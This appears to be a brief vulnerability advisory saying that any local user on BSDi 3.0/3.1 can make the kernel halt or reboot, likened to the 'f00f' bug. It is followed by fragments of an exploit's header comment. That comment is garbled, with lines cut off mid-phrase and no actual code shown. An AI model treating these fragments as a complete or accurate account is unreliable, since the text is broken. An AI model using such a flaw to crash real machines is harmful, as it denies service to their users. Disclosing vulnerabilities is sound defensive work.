It has been reported that there is a locally exploitable vulnerability in BSDI.

It is allegedly possible for a userland process to cause the kernel to halt.

This may be due to a bad system call.

/* (BSDi)*[v3.0/3.1] system failure, by

   in the ability of any user to fail the

   similar to that of the "f00f" bug.
   results are similar, except this reboots
   the machine instead of having a freezing
   effect.  tested, and built for: BSDi
